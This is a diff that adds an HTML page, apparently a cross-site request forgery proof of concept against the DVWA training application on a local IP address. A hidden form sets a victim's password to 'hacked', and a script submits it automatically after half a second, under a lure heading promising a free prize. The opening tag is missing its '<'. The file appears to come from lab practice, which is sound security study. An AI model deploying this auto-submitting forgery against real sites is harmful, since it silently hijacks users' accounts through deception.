@@ -1,0 +1,15 @@
+html>
+  <body>
+    <form action="http://192.168.1.113/dvwa/vulnerabilities/csrf/" method="GET" id="csrf-form">
+      <input type="hidden" name="password_new" value="hacked" />
+      <input type="hidden" name="password_conf" value="hacked" />
+      <input type="hidden" name="Change" value="Change" />
+    </form>
+    <script>
+      // Wait a short time to ensure the victim tab has session cookie ready
+      setTimeout(function(){ document.getElementById("csrf-form").submit(); }, 500);
+    </script>
+    <h1>Click here for a free prize!</h1>
+  </body>
+</html>
+
